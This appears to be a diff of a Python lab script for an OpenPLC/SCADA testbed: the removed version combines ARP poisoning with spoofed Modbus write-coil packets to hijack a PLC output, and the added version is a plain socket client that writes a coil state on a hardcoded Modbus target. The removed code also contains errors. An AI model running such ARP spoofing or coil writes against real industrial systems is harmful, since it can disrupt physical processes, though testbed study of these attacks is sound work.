@@ -1,52 +1,43 @@
-from scapy.all import *
-from scapy.all import sendp
-from scapy.layers.inet import IP, TCP
-from scapy.layers.l2 import Ether, ARP
-from scapy.contrib.modbus import *
-import struct, threading, os
+import socket
 
-# Enable IP forwarding (to avoid DoS)
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+# Prompt user for coil address
+coil_address = int(input("Enter the coil address (1-9999): "))
 
-TargetIP = "192.168.163.130"
-TargetPort = 502
-SCADA_IP="192.168.254.20"
-SCADA_MAC=input("Enter SCADA MAC: ")
-OPLC_MAC=input("Enter OpenPLC MAC: ")
-Coil_Address=int(input("Enter Coil address to attack"))
-Output_Val=int(input("Enter 1 or 0 to write to coil: "))
-# Destination
-target_ip = "192.168.254.10"
-target_port = 502  # Standard Modbus TCP port
+# Validate coil address input
+if coil_address < 1 or coil_address > 9999:
+    print("Invalid coil address. Please enter a value between 1 and 9999.")
+    exit(1)
 
-def poison():
-    arp_poison = ARP(op=2, pdst=SCADA_IP, psrc=TargetIP, hwdst=SCADA_MAC)
-    sendp(arp_poison, iface="eth0", loop=True, inter=1)
-# Build Modbus payload
-def packet():
-    modbus_packet = (
-            IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags="S")
-    # TCP 3-way if you want to be proper
-    )
+# Prompt user for desired coil state (on or off)
+coil_state = input("Enter the coil state (on/off): ").strip().lower()
 
-    # Raw Modbus payload (write coil at address )
-    mb_payload = (
-            ModbusADURequest(transId=RandShort(), unitId=1) /
-            ModbusPDU05WriteSingleCoilRequest(outputAddress=Coil_Address, outputValue=Output_Val)
-    )
+# Validate coil state input
+if coil_state not in ["on", "off"]:
+    print("Invalid state. Please enter 'on' or 'off'.")
+    exit(1)
 
-    ether=Ether(src=SCADA_MAC, dest=OPLC_MAC)
-    ip=IP(src=SCADA_IP, dst=target_ip)
-    tcp=TCP(dport=target_port,sport=RandShort(),flags="PA")
-    # Full TCP Modbus frame
-    pkt = ether / ip / tcp / mb_payload
+# Adjust coil address to 0-based (subtract 1)
+coil_address -= 1
 
-    # Send
-    send(pkt)
+# Prepare the Modbus packet
+coil_address_bytes = coil_address.to_bytes(2, byteorder='big')
 
-threading.Thread(target=poison, daemon=True).start()
+# Set the coil state (0xFF00 for ON, 0x0000 for OFF)
+if coil_state == "on":
+    coil_value = bytes.fromhex("FF 00")
+elif coil_state == "off":
+    coil_value = bytes.fromhex("00 00")
 
-Packet()
+# Modbus packet format: Transaction ID, Protocol, Length, Unit ID, Function Code, Coil address, Value
+modbus_packet = bytes.fromhex("00 01 00 00 00 06 01 05") + coil_address_bytes + coil_value
 
+target_ip = "192.168.163.10"
+target_port = 502
 
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.settimeout(3)
+    s.connect((target_ip, target_port))
+    s.send(modbus_packet)
 
+    response = s.recv(1024)
+    print("Response:", response.hex())
